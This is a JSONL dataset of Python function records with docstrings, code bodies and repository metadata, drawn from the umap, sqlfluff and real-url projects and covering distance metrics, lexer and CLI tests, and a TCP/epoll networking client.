{"docstring": "\"\"\"Standard euclidean distance.\n\n..math::\n    D(x, y) = \\sqrt{\\sum_i (x_i - y_i)^2}\n\"\"\"\n", "func_signal": "def torus_euclidean_grad(x, y, torus_dimensions=(2 * np.pi, 2 * np.pi)):\n", "code": "distance_sqr = 0.0\ng = np.zeros_like(x)\nfor i in range(x.shape[0]):\n    a = abs(x[i] - y[i])\n    if 2 * a < torus_dimensions[i]:\n        distance_sqr += a ** 2\n        g[i] = x[i] - y[i]\n    else:\n        distance_sqr += (torus_dimensions[i] - a) ** 2\n        g[i] = (x[i] - y[i]) * (a - torus_dimensions[i]) / a\ndistance = np.sqrt(distance_sqr)\nreturn distance, g / (1e-6 + distance)", "path": "umap/examples/mnist_torus_sphere_example.py", "commit_date": "2020-03-03 00:00:00", "repo_name": "lmcinnes/umap", "stars": 6823, "license": "bsd-3-clause", "language": "python", "size": 61740}
{"docstring": "# Check that metric is supported for this test, otherwise, fail!\n", "func_signal": "def binary_check(metric, binary_data, binary_distances):\n", "code": "assert metric in binary_distances, f\"{metric} not valid for binary data\"\ndist_matrix = pairwise_distances(binary_data, metric=metric)\n\nif metric in (\"jaccard\", \"dice\", \"sokalsneath\", \"yule\"):\n    dist_matrix[np.where(~np.isfinite(dist_matrix))] = 0.0\n\nif metric in (\"kulsinski\", \"russellrao\"):\n    dist_matrix[np.where(~np.isfinite(dist_matrix))] = 0.0\n    # And because distance between all zero vectors should be zero\n    dist_matrix[10, 11] = 0.0\n    dist_matrix[11, 10] = 0.0\n\nrun_test_metric(metric, binary_data, dist_matrix)", "path": "umap/umap/tests/test_umap_metrics.py", "commit_date": "2020-11-24 00:00:00", "repo_name": "lmcinnes/umap", "stars": 6823, "license": "bsd-3-clause", "language": "python", "size": 61740}
{"docstring": "\"\"\"A fast computation of knn indices.\n\nParameters\n----------\nX: array of shape (n_samples, n_features)\n    The input data to compute the k-neighbor indices of.\n\nn_neighbors: int\n    The number of nearest neighbors to compute for each sample in ``X``.\n\nReturns\n-------\nknn_indices: array of shape (n_samples, n_neighbors)\n    The indices on the ``n_neighbors`` closest points in the dataset.\n\"\"\"\n", "func_signal": "def fast_knn_indices(X, n_neighbors):\n", "code": "knn_indices = np.empty((X.shape[0], n_neighbors), dtype=np.int32)\nfor row in numba.prange(X.shape[0]):\n    # v = np.argsort(X[row])  # Need to call argsort this way for numba\n    v = X[row].argsort(kind=\"quicksort\")\n    v = v[:n_neighbors]\n    knn_indices[row] = v\nreturn knn_indices", "path": "umap/umap/utils.py", "commit_date": "2020-11-23 00:00:00", "repo_name": "lmcinnes/umap", "stars": 6823, "license": "bsd-3-clause", "language": "python", "size": 61740}
{"docstring": "\"\"\"Core utility function to test target metric on test data\"\"\"\n", "func_signal": "def run_test_metric(metric, test_data, dist_matrix, with_grad=False):\n", "code": "if with_grad:\n    dist_function = dist.named_distances_with_gradients[metric]\nelse:\n    dist_function = dist.named_distances[metric]\nsample_size = test_data.shape[0]\ntest_matrix = [\n    [dist_function(test_data[i], test_data[j]) for j in range(sample_size)]\n    for i in range(sample_size)\n]\nif with_grad:\n    test_matrix = [d for pairs in test_matrix for d, grad in pairs]\n\ntest_matrix = np.array(test_matrix).reshape(sample_size, sample_size)\n\nassert_array_almost_equal(\n    test_matrix,\n    dist_matrix,\n    err_msg=\"Distances don't match \" \"for metric {}\".format(metric),\n)", "path": "umap/umap/tests/test_umap_metrics.py", "commit_date": "2020-11-24 00:00:00", "repo_name": "lmcinnes/umap", "stars": 6823, "license": "bsd-3-clause", "language": "python", "size": 61740}
{"docstring": "\"\"\"A fast (pseudo)-random number generator for floats in the range [0,1]\n\nParameters\n----------\nstate: array of int64, shape (3,)\n    The internal state of the rng\n\nReturns\n-------\nA (pseudo)-random float32 in the interval [0, 1]\n\"\"\"\n", "func_signal": "def tau_rand(state):\n", "code": "integer = tau_rand_int(state)\nreturn abs(float(integer) / 0x7FFFFFFF)", "path": "umap/umap/utils.py", "commit_date": "2020-11-23 00:00:00", "repo_name": "lmcinnes/umap", "stars": 6823, "license": "bsd-3-clause", "language": "python", "size": 61740}
{"docstring": "\"\"\"Core utility function to run test of target metric on sparse data\"\"\"\n", "func_signal": "def run_test_sparse_metric(metric, sparse_test_data, dist_matrix):\n", "code": "dist_function = spdist.sparse_named_distances[metric]\nif metric in spdist.sparse_need_n_features:\n    test_matrix = np.array(\n        [\n            [\n                dist_function(\n                    sparse_test_data[i].indices,\n                    sparse_test_data[i].data,\n                    sparse_test_data[j].indices,\n                    sparse_test_data[j].data,\n                    sparse_test_data.shape[1],\n                )\n                for j in range(sparse_test_data.shape[0])\n            ]\n            for i in range(sparse_test_data.shape[0])\n        ]\n    )\nelse:\n    test_matrix = np.array(\n        [\n            [\n                dist_function(\n                    sparse_test_data[i].indices,\n                    sparse_test_data[i].data,\n                    sparse_test_data[j].indices,\n                    sparse_test_data[j].data,\n                )\n                for j in range(sparse_test_data.shape[0])\n            ]\n            for i in range(sparse_test_data.shape[0])\n        ]\n    )\nassert_array_almost_equal(\n    test_matrix,\n    dist_matrix,\n    err_msg=\"Sparse distances don't match \" \"for metric {}\".format(metric),\n)", "path": "umap/umap/tests/test_umap_metrics.py", "commit_date": "2020-11-24 00:00:00", "repo_name": "lmcinnes/umap", "stars": 6823, "license": "bsd-3-clause", "language": "python", "size": 61740}
{"docstring": "\"\"\"Test that transforming data does not alter the learned embeddings\n\nIssue #217 describes how using transform to embed new data using a\ntrained UMAP transformer causes the fitting embedding matrix to change\nin cases when the new data has the same number of rows as the original\ntraining data.\n\"\"\"\n\n", "func_signal": "def test_umap_transform_embedding_stability(iris, iris_subset_model, iris_selection):\n", "code": "data = iris.data[iris_selection]\nfitter = iris_subset_model\noriginal_embedding = fitter.embedding_.copy()\n\n# The important point is that the new data has the same number of rows\n# as the original fit data\nnew_data = np.random.random(data.shape)\n_ = fitter.transform(new_data)\n\nassert_array_equal(\n    original_embedding,\n    fitter.embedding_,\n    \"Transforming new data changed the original embeddings\",\n)\n\n# Example from issue #217\na = np.random.random((100, 10))\nb = np.random.random((100, 5))\n\numap = UMAP(n_epochs=100)\nu1 = umap.fit_transform(a[:, :5])\nu1_orig = u1.copy()\nassert_array_equal(u1_orig, umap.embedding_)\n\n_ = umap.transform(b)\nassert_array_equal(u1_orig, umap.embedding_)", "path": "umap/umap/tests/test_umap_ops.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "lmcinnes/umap", "stars": 6823, "license": "bsd-3-clause", "language": "python", "size": 61740}
{"docstring": "# Check that metric is supported for this test, otherwise, fail!\n", "func_signal": "def spatial_check(metric, spatial_data, spatial_distances, with_grad=False):\n", "code": "assert metric in spatial_distances, f\"{metric} not valid for spatial data\"\ndist_matrix = pairwise_distances(spatial_data, metric=metric)\n# scipy is bad sometimes\nif metric == \"braycurtis\":\n    dist_matrix[np.where(~np.isfinite(dist_matrix))] = 0.0\n\nif metric in (\"cosine\", \"correlation\"):\n    dist_matrix[np.where(~np.isfinite(dist_matrix))] = 1.0\n    # And because distance between all zero vectors should be zero\n    dist_matrix[10, 11] = 0.0\n    dist_matrix[11, 10] = 0.0\n\nrun_test_metric(metric, spatial_data, dist_matrix, with_grad=with_grad)", "path": "umap/umap/tests/test_umap_metrics.py", "commit_date": "2020-11-24 00:00:00", "repo_name": "lmcinnes/umap", "stars": 6823, "license": "bsd-3-clause", "language": "python", "size": 61740}
{"docstring": "# - Spatial Data\n", "func_signal": "def spatial_data():\n", "code": "spatial_data = np.random.randn(10, 20)\n# Add some all zero data for corner case test\nreturn np.vstack([spatial_data, np.zeros((2, 20))])", "path": "umap/umap/tests/conftest.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "lmcinnes/umap", "stars": 6823, "license": "bsd-3-clause", "language": "python", "size": 61740}
{"docstring": "\"\"\"tests adding a validation dataset\"\"\"\n", "func_signal": "def test_validation():\n", "code": "X, y = make_moons(100)\n\nX_valid, y = make_moons(100)\nembedder = ParametricUMAP(\n    parametric_reconstruction=True, reconstruction_validation=X_valid, verbose=True,\n)\nembedding = embedder.fit_transform(X)", "path": "umap/umap/tests/test_parametric_umap.py", "commit_date": "2020-11-22 00:00:00", "repo_name": "lmcinnes/umap", "stars": 6823, "license": "bsd-3-clause", "language": "python", "size": 61740}
{"docstring": "# spatial data repeats\n", "func_signal": "def spatial_repeats(spatial_data):\n", "code": "spatial_repeats = np.vstack(\n    [np.repeat(spatial_data[0:2], [2, 0], axis=0), spatial_data, np.zeros((2, 20))]\n)\n# Add some all zero data for corner case test.  Make the first three rows identical\n# binary Data Repeat\nreturn spatial_repeats", "path": "umap/umap/tests/conftest.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "lmcinnes/umap", "stars": 6823, "license": "bsd-3-clause", "language": "python", "size": 61740}
{"docstring": "\"\"\"Reduced Euclidean distance.\n\nParameters\n----------\nx: array of shape (embedding_dim,)\ny: array of shape (embedding_dim,)\n\nReturns\n-------\nThe squared euclidean distance between x and y\n\"\"\"\n", "func_signal": "def rdist(x, y):\n", "code": "result = 0.0\ndim = x.shape[0]\nfor i in range(dim):\n    diff = x[i] - y[i]\n    result += diff * diff\n\nreturn result", "path": "umap/umap/layouts.py", "commit_date": "2020-11-22 00:00:00", "repo_name": "lmcinnes/umap", "stars": 6823, "license": "bsd-3-clause", "language": "python", "size": 61740}
{"docstring": "# Check that metric is supported for this test, otherwise, fail!\n", "func_signal": "def sparse_spatial_check(metric, sparse_spatial_data):\n", "code": "assert (\n    metric in spdist.sparse_named_distances\n), f\"{metric} not supported for sparse data\"\ndist_matrix = pairwise_distances(sparse_spatial_data.todense(), metric=metric)\n\nif metric in (\"braycurtis\", \"dice\", \"sokalsneath\", \"yule\"):\n    dist_matrix[np.where(~np.isfinite(dist_matrix))] = 0.0\n\nif metric in (\"cosine\", \"correlation\", \"kulsinski\", \"russellrao\"):\n    dist_matrix[np.where(~np.isfinite(dist_matrix))] = 1.0\n    # And because distance between all zero vectors should be zero\n    dist_matrix[10, 11] = 0.0\n    dist_matrix[11, 10] = 0.0\n\nrun_test_sparse_metric(metric, sparse_spatial_data, dist_matrix)", "path": "umap/umap/tests/test_umap_metrics.py", "commit_date": "2020-11-24 00:00:00", "repo_name": "lmcinnes/umap", "stars": 6823, "license": "bsd-3-clause", "language": "python", "size": 61740}
{"docstring": "\"\"\"Compute the (standard l2) norm of a vector.\n\nParameters\n----------\nvec: array of shape (dim,)\n\nReturns\n-------\nThe l2 norm of vec.\n\"\"\"\n", "func_signal": "def norm(vec):\n", "code": "result = 0.0\nfor i in range(vec.shape[0]):\n    result += vec[i] ** 2\nreturn np.sqrt(result)", "path": "umap/umap/utils.py", "commit_date": "2020-11-23 00:00:00", "repo_name": "lmcinnes/umap", "stars": 6823, "license": "bsd-3-clause", "language": "python", "size": 61740}
{"docstring": "\"\"\"Return a submatrix given an orginal matrix and the indices to keep.\n\nParameters\n----------\ndmat: array, shape (n_samples, n_samples)\n    Original matrix.\n\nindices_col: array, shape (n_samples, n_neighbors)\n    Indices to keep. Each row consists of the indices of the columns.\n\nn_neighbors: int\n    Number of neighbors.\n\nReturns\n-------\nsubmat: array, shape (n_samples, n_neighbors)\n    The corresponding submatrix.\n\"\"\"\n", "func_signal": "def submatrix(dmat, indices_col, n_neighbors):\n", "code": "n_samples_transform, n_samples_fit = dmat.shape\nsubmat = np.zeros((n_samples_transform, n_neighbors), dtype=dmat.dtype)\nfor i in numba.prange(n_samples_transform):\n    for j in numba.prange(n_neighbors):\n        submat[i, j] = dmat[i, indices_col[i, j]]\nreturn submat", "path": "umap/umap/utils.py", "commit_date": "2020-11-23 00:00:00", "repo_name": "lmcinnes/umap", "stars": 6823, "license": "bsd-3-clause", "language": "python", "size": 61740}
{"docstring": "\"\"\"test using a custom encoder / decoder\"\"\"\n", "func_signal": "def test_custom_encoder_decoder():\n", "code": "X, y = make_moons(100)\n\ndims = (2,)\nn_components = 2\nencoder = tf.keras.Sequential(\n    [\n        tf.keras.layers.InputLayer(input_shape=dims),\n        tf.keras.layers.Flatten(),\n        tf.keras.layers.Dense(units=100, activation=\"relu\"),\n        tf.keras.layers.Dense(units=100, activation=\"relu\"),\n        tf.keras.layers.Dense(units=100, activation=\"relu\"),\n        tf.keras.layers.Dense(units=n_components, name=\"z\"),\n    ]\n)\n\ndecoder = tf.keras.Sequential(\n    [\n        tf.keras.layers.InputLayer(input_shape=n_components),\n        tf.keras.layers.Dense(units=100, activation=\"relu\"),\n        tf.keras.layers.Dense(units=100, activation=\"relu\"),\n        tf.keras.layers.Dense(units=100, activation=\"relu\"),\n        tf.keras.layers.Dense(\n            units=np.product(dims), name=\"recon\", activation=None\n        ),\n        tf.keras.layers.Reshape(dims),\n    ]\n)\n\nembedder = ParametricUMAP(\n    encoder=encoder,\n    decoder=decoder,\n    dims=dims,\n    parametric_reconstruction=True,\n    verbose=True,\n)\nembedding = embedder.fit_transform(X)", "path": "umap/umap/tests/test_parametric_umap.py", "commit_date": "2020-11-22 00:00:00", "repo_name": "lmcinnes/umap", "stars": 6823, "license": "bsd-3-clause", "language": "python", "size": 61740}
{"docstring": "\"\"\"Test the lexer splits as expected in a selection of cases.\"\"\"\n", "func_signal": "def test__parser__lexer_obj(raw, res, caplog):\n", "code": "lex = Lexer(config=FluffConfig())\nwith caplog.at_level(logging.DEBUG):\n    lexing_segments, _ = lex.lex(raw)\n    assert [seg.raw for seg in lexing_segments] == res", "path": "sqlfluff/test/core/parser/lexer_test.py", "commit_date": "2020-11-23 00:00:00", "repo_name": "sqlfluff/sqlfluff", "stars": 7081, "license": "mit", "language": "python", "size": 27169}
{"docstring": "\"\"\"Test formatting violations.\n\nNB Position is 1 + start_pos.\n\"\"\"\n", "func_signal": "def test__cli__formatters__violation():\n", "code": "s = RawSegment(\"foobarbar\", FilePositionMarker(0, 20, 11, 100))\nr = RuleGhost(\"A\", \"DESC\")\nv = SQLLintError(segment=s, rule=r)\nf = format_violation(v)\nassert escape_ansi(f) == \"L:  20 | P:  11 |    A | DESC\"", "path": "sqlfluff/test/cli/formatters_test.py", "commit_date": "2020-10-24 00:00:00", "repo_name": "sqlfluff/sqlfluff", "stars": 7081, "license": "mit", "language": "python", "size": 27169}
{"docstring": "\"\"\"Test formatting filenames.\"\"\"\n", "func_signal": "def test__cli__formatters__filename_nocol():\n", "code": "res = format_filename(\"blahblah\", success=True)\nassert escape_ansi(res) == \"== [blahblah] PASS\"", "path": "sqlfluff/test/cli/formatters_test.py", "commit_date": "2020-10-24 00:00:00", "repo_name": "sqlfluff/sqlfluff", "stars": 7081, "license": "mit", "language": "python", "size": 27169}
{"docstring": "\"\"\"Test the how the lexer fails and reports errors.\"\"\"\n", "func_signal": "def test__parser__lexer_fail():\n", "code": "lex = Lexer(config=FluffConfig())\n\n_, vs = lex.lex(\"Select \\u0394\")\n\nassert len(vs) == 1\nerr = vs[0]\nassert isinstance(err, SQLLexError)\nassert err.pos_marker().char_pos == 7", "path": "sqlfluff/test/core/parser/lexer_test.py", "commit_date": "2020-11-23 00:00:00", "repo_name": "sqlfluff/sqlfluff", "stars": 7081, "license": "mit", "language": "python", "size": 27169}
{"docstring": "\"\"\"Remove ANSI color codes for testing.\"\"\"\n", "func_signal": "def escape_ansi(line):\n", "code": "ansi_escape = re.compile(u\"\\u001b\\\\[[0-9]+(;[0-9]+)?m\")\nreturn ansi_escape.sub(\"\", line)", "path": "sqlfluff/test/cli/formatters_test.py", "commit_date": "2020-10-24 00:00:00", "repo_name": "sqlfluff/sqlfluff", "stars": 7081, "license": "mit", "language": "python", "size": 27169}
{"docstring": "\"\"\"Test the how the parser fails and reports errors while lexing.\"\"\"\n", "func_signal": "def test__parser__lexer_fail_via_parse():\n", "code": "lexer = Lexer(config=FluffConfig())\n_, vs = lexer.lex(\"Select \\u0394\")\nassert vs\nassert len(vs) == 1\nerr = vs[0]\nassert isinstance(err, SQLLexError)\nassert err.pos_marker().char_pos == 7", "path": "sqlfluff/test/core/parser/lexer_test.py", "commit_date": "2020-11-23 00:00:00", "repo_name": "sqlfluff/sqlfluff", "stars": 7081, "license": "mit", "language": "python", "size": 27169}
{"docstring": "\"\"\"Process a nested dict or dict-like into a check tuple.\"\"\"\n", "func_signal": "def process_struct(obj):\n", "code": "if isinstance(obj, dict):\n    return tuple((k, process_struct(obj[k])) for k in obj)\nelif isinstance(obj, list):\n    # We'll assume that it's a list of dicts\n    if isinstance(obj[0], dict):\n        buff = [process_struct(elem) for elem in obj]\n        if any(len(elem) > 1 for elem in buff):\n            raise ValueError(\n                \"Not sure how to deal with multi key dict: {0!r}\".format(buff)\n            )\n        return tuple(elem[0] for elem in buff)\n    else:\n        raise TypeError(\n            \"Did not expect a list of {0}: {1!r}\".format(type(obj[0]), obj[0])\n        )\nelif isinstance(obj, (str, int, float)):\n    return str(obj)\nelif obj is None:\n    raise TypeError(\n        \"Found a null value in dict. This is probably a misconfiguration.\"\n    )\nelse:\n    raise TypeError(\n        \"Not sure how to deal with type {0}: {1!r}\".format(type(obj), obj)\n    )", "path": "sqlfluff/test/conftest.py", "commit_date": "2020-11-15 00:00:00", "repo_name": "sqlfluff/sqlfluff", "stars": 7081, "license": "mit", "language": "python", "size": 27169}
{"docstring": "\"\"\"Return list of violations.\n\nGiven the path to a .sql file, analyze it and return a list of\nviolations (i.e. formatting or style issues).\n\n:param src_path:\n:return: list of Violation\n\"\"\"\n", "func_signal": "def violations(src_path):\n", "code": "linter = Linter(config=FluffConfig.from_root())\nlinted_path = linter.lint_path(src_path, ignore_non_existent_files=True)\nresult = []\nfor violation in linted_path.get_violations():\n    try:\n        # Normal SQLFluff warnings\n        message = violation.description\n    except AttributeError:\n        # Parse errors\n        message = str(violation)\n    result.append(Violation(violation.line_no(), message))\nreturn result", "path": "sqlfluff/src/sqlfluff/diff_quality_plugin.py", "commit_date": "2020-10-23 00:00:00", "repo_name": "sqlfluff/sqlfluff", "stars": 7081, "license": "mit", "language": "python", "size": 27169}
{"docstring": "\"\"\"Load a yaml structure and process it into a tuple.\"\"\"\n# Load raw file\n", "func_signal": "def load_yaml(fpath):\n", "code": "with open(fpath) as f:\n    raw = f.read()\n# Parse the yaml\nobj = oyaml.safe_load(raw)\n# Return the parsed and structured object\nreturn process_struct(obj)[0]", "path": "sqlfluff/test/conftest.py", "commit_date": "2020-11-15 00:00:00", "repo_name": "sqlfluff/sqlfluff", "stars": 7081, "license": "mit", "language": "python", "size": 27169}
{"docstring": "\"\"\"Test line padding.\"\"\"\n", "func_signal": "def test__cli__helpers__pad_line():\n", "code": "assert pad_line(\"abc\", 5) == \"abc  \"\nassert pad_line(\"abcdef\", 10, align=\"right\") == \"    abcdef\"", "path": "sqlfluff/test/cli/helpers_test.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "sqlfluff/sqlfluff", "stars": 7081, "license": "mit", "language": "python", "size": 27169}
{"docstring": "\"\"\"Test simple wrapping.\"\"\"\n", "func_signal": "def test__cli__helpers__wrap_field_c():\n", "code": "dct = wrap_field(\"how now brn cow\", \"How Now Brown Cow\", width=25)\nassert dct[\"label_list\"] == [\"how now\", \"brn cow\"]\nassert dct[\"label_width\"] == 7\nassert dct[\"val_list\"] == [\"How Now Brown\", \"Cow\"]\nassert dct[\"lines\"] == 2", "path": "sqlfluff/test/cli/helpers_test.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "sqlfluff/sqlfluff", "stars": 7081, "license": "mit", "language": "python", "size": 27169}
{"docstring": "\"\"\"Test the SingletonMatcher.\"\"\"\n", "func_signal": "def test__parser__lexer_singleton(raw, res):\n", "code": "matcher = SingletonMatcher(\n    \"dot\", \".\", RawSegment.make(\".\", name=\"dot\", is_code=True)\n)\nassert_matches(raw, matcher, res)", "path": "sqlfluff/test/core/parser/lexer_test.py", "commit_date": "2020-11-23 00:00:00", "repo_name": "sqlfluff/sqlfluff", "stars": 7081, "license": "mit", "language": "python", "size": 27169}
{"docstring": "\"\"\"Test simple wrapping with overlap avoidance.\"\"\"\n", "func_signal": "def test__cli__helpers__wrap_field_b():\n", "code": "dct = wrap_field(\"abc\", \"How Now Brown Cow\", width=23)\nassert dct[\"label_list\"] == [\"abc\"]\nassert dct[\"val_list\"] == [\"How Now Brown Cow\"]\nassert dct[\"label_width\"] == 3", "path": "sqlfluff/test/cli/helpers_test.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "sqlfluff/sqlfluff", "stars": 7081, "license": "mit", "language": "python", "size": 27169}
{"docstring": "\"\"\"Test the RegexMatcher.\"\"\"\n", "func_signal": "def test__parser__lexer_regex(raw, reg, res, caplog):\n", "code": "matcher = RegexMatcher(\"test\", reg, RawSegment.make(\"test\", name=\"test\"))\nwith caplog.at_level(logging.DEBUG):\n    assert_matches(raw, matcher, res)", "path": "sqlfluff/test/core/parser/lexer_test.py", "commit_date": "2020-11-23 00:00:00", "repo_name": "sqlfluff/sqlfluff", "stars": 7081, "license": "mit", "language": "python", "size": 27169}
{"docstring": "\"\"\"Test the raw templater.\"\"\"\n", "func_signal": "def test__templater_raw():\n", "code": "t = RawTemplater()\ninstr = \"SELECT * FROM {{blah}}\"\noutstr, _ = t.process(in_str=instr)\nassert instr == str(outstr)", "path": "sqlfluff/test/core/templaters/base_test.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "sqlfluff/sqlfluff", "stars": 7081, "license": "mit", "language": "python", "size": 27169}
{"docstring": "\"\"\"Test simple wrapping.\"\"\"\n", "func_signal": "def test__cli__helpers__wrap_field_a():\n", "code": "dct = wrap_field(\"abc\", \"How Now Brown Cow\", width=40)\nassert dct[\"label_list\"] == [\"abc\"]\nassert dct[\"val_list\"] == [\"How Now Brown Cow\"]\nassert \"sep_char\" in dct\nassert dct[\"lines\"] == 1\nassert dct[\"label_width\"] == 3", "path": "sqlfluff/test/cli/helpers_test.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "sqlfluff/sqlfluff", "stars": 7081, "license": "mit", "language": "python", "size": 27169}
{"docstring": "\"\"\"Replaces variables in docs, including code blocks.\n\nFrom: https://github.com/sphinx-doc/sphinx/issues/4054#issuecomment-329097229\n\"\"\"\n", "func_signal": "def ultimate_replace(app, docname, source):\n", "code": "result = source[0]\nfor key in app.config.ultimate_replacements:\n    result = result.replace(key, app.config.ultimate_replacements[key])\nsource[0] = result", "path": "sqlfluff/docs/source/conf.py", "commit_date": "2020-12-05 00:00:00", "repo_name": "sqlfluff/sqlfluff", "stars": 7081, "license": "mit", "language": "python", "size": 27169}
{"docstring": "\"\"\"Roughly generate test segments.\n\nThis is a factory function so that it works as a fixture,\nbut when actually used, this will return the inner function\nwhich is what you actually need.\n\"\"\"\n\n", "func_signal": "def generate_test_segments():\n", "code": "def generate_test_segments_func(elems):\n    \"\"\"Roughly generate test segments.\n\n    This function isn't totally robust, but good enough\n    for testing. Use with caution.\n    \"\"\"\n    buff = []\n    raw_buff = \"\"\n    for elem in elems:\n        if set(elem) <= {\" \", \"\\t\"}:\n            cls = RawSegment.make(\" \", name=\"whitespace\", type=\"whitespace\")\n        elif set(elem) <= {\"\\n\"}:\n            cls = RawSegment.make(\"\\n\", name=\"newline\", type=\"newline\")\n        elif elem == \"(\":\n            cls = RawSegment.make(\"(\", name=\"bracket_open\", _is_code=True)\n        elif elem == \")\":\n            cls = RawSegment.make(\")\", name=\"bracket_close\", _is_code=True)\n        elif elem.startswith(\"--\"):\n            cls = RawSegment.make(\"--\", name=\"inline_comment\")\n        elif elem.startswith('\"'):\n            cls = RawSegment.make('\"', name=\"double_quote\", _is_code=True)\n        elif elem.startswith(\"'\"):\n            cls = RawSegment.make(\"'\", name=\"single_quote\", _is_code=True)\n        else:\n            cls = RawSegment.make(\"\", _is_code=True)\n\n        buff.append(cls(elem, FilePositionMarker().advance_by(raw_buff)))\n        raw_buff += elem\n    return tuple(buff)  # Make sure we return a tuple\n\n# Return the function\nreturn generate_test_segments_func", "path": "sqlfluff/test/conftest.py", "commit_date": "2020-11-15 00:00:00", "repo_name": "sqlfluff/sqlfluff", "stars": 7081, "license": "mit", "language": "python", "size": 27169}
{"docstring": "\"\"\"Test wrapping.\"\"\"\n", "func_signal": "def test__cli__helpers__wrap_elem(in_str, length, res):\n", "code": "str_list = wrap_elem(in_str, length)\nassert str_list == res", "path": "sqlfluff/test/cli/helpers_test.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "sqlfluff/sqlfluff", "stars": 7081, "license": "mit", "language": "python", "size": 27169}
{"docstring": "\"\"\"Test template selection by name.\"\"\"\n", "func_signal": "def test__templater_selection():\n", "code": "assert templater_selector().__class__ is JinjaTemplater\nassert templater_selector(\"raw\").__class__ is RawTemplater\nassert templater_selector(\"python\").__class__ is PythonTemplater\nassert templater_selector(\"jinja\").__class__ is JinjaTemplater\nwith pytest.raises(ValueError):\n    templater_selector(\"afefhlsakufe\")", "path": "sqlfluff/test/core/templaters/base_test.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "sqlfluff/sqlfluff", "stars": 7081, "license": "mit", "language": "python", "size": 27169}
{"docstring": "'''\n@brief: \u5e8f\u5217\u5316\u8bf7\u6c42\u62a5\u6587\n@return: \u5e8f\u5217\u5316\u540e\u7684\u8bf7\u6c42\u62a5\u6587\n@rtype: str\n'''\n", "func_signal": "def packReq(self):\n", "code": "if not self.request:\n    return ''\noos = TarsOutputStream()\nRequestPacket.writeTo(oos, self.request)\nreqpkt = oos.getBuffer()\nplen = len(reqpkt) + 4\nreqpkt = struct.pack('!i', plen) + reqpkt\nreturn reqpkt", "path": "real-url/danmu/danmaku/tars/__TimeoutQueue.py", "commit_date": "2020-06-18 00:00:00", "repo_name": "wbt5/real-url", "stars": 6934, "license": "gpl-2.0", "language": "python", "size": 406}
{"docstring": "'''\n@brief: \u5c06\u8bf7\u6c42\u6570\u636e\u53d1\u9001\u51fa\u53bb\n@return: \u53d1\u9001\u7684\u5b57\u8282\u6570\n@rtype: int\n'''\n", "func_signal": "def doRequest(self):\n", "code": "tarsLogger.debug('Transceiver:doRequest')\nif not self.isValid():\n    return -1\n\nnbytes = 0\nbuf = buffer(self._sendBuff)\nwhile True:\n    if not buf:\n        break\n    ret = self.send(buf[nbytes:])\n    if ret > 0:\n        nbytes += ret\n    else:\n        break\n\n# \u53d1\u9001\u524d\u9762\u7684\u5b57\u8282\u540e\u5c06\u540e\u9762\u7684\u5b57\u8282\u62f7\u8d1d\u4e0a\u6765\nself._sendBuff = buf[nbytes:]\nreturn nbytes", "path": "real-url/danmu/danmaku/tars/__trans.py", "commit_date": "2020-06-18 00:00:00", "repo_name": "wbt5/real-url", "stars": 6934, "license": "gpl-2.0", "language": "python", "size": 406}
{"docstring": "'''\n@brief: \u5904\u7406\u63a5\u6536\u7684\u6570\u636e\n@return: \u8fd4\u56de\u54cd\u5e94\u62a5\u6587\u7684\u5217\u8868\uff0c\u5982\u679c\u51fa\u9519\u8fd4\u56deNone\n@rtype: list: ResponsePacket\n'''\n", "func_signal": "def doResponse(self):\n", "code": "tarsLogger.debug('TcpTransceiver:doResponse')\nif not self.isValid():\n    return None\n\nbufs = [self._recvBuf]\nwhile True:\n    buf = self.recv(8292)\n    if not buf:\n        break\n    bufs.append(buf)\nself._recvBuf = ''.join(bufs)\ntarsLogger.info('tcp doResponse, fd: %d, recvbuf: %d',\n                self.getFd(), len(self._recvBuf))\n\nif not self._recvBuf:\n    return None\n\nrsplist = None\ntry:\n    rsplist, bufsize = ReqMessage.unpackRspList(self._recvBuf)\n    self._recvBuf = self._recvBuf[bufsize:]\nexcept Exception as msg:\n    tarsLogger.error(\n        'tcp doResponse, fd: %d, %s, tcp recv unpack error: %s',\n        self.getFd(), self.getEndPointInfo(), msg)\n    self.close()\n\nreturn rsplist", "path": "real-url/danmu/danmaku/tars/__trans.py", "commit_date": "2020-06-18 00:00:00", "repo_name": "wbt5/real-url", "stars": 6934, "license": "gpl-2.0", "language": "python", "size": 406}
{"docstring": "'''\n@brief: \u7ebf\u7a0b\u542f\u52a8\u51fd\u6570\uff0c\u5faa\u73af\u76d1\u542c\u7f51\u7edc\u4e8b\u4ef6\n'''\n", "func_signal": "def run(self):\n", "code": "tarsLogger.debug('FDReactor:run')\n\nwhile not self.__terminate:\n    try:\n        eplist = self.__ep.poll(1)\n        if eplist:\n            tarsLogger.debug('FDReactor run get eplist : %s, terminate : %s', str(\n                eplist), self.__terminate)\n        if self.__terminate:\n            tarsLogger.debug('FDReactor terminate')\n            break\n        for fd, events in eplist:\n            adapter = self.__adapterTab.get(fd, None)\n            if not adapter:\n                continue\n            self.handle(adapter, events)\n    except Exception as msg:\n        tarsLogger.error('FDReactor run exception: %s', msg)\n\ntarsLogger.debug('FDReactor:run finished')", "path": "real-url/danmu/danmaku/tars/__trans.py", "commit_date": "2020-06-18 00:00:00", "repo_name": "wbt5/real-url", "stars": 6934, "license": "gpl-2.0", "language": "python", "size": 406}
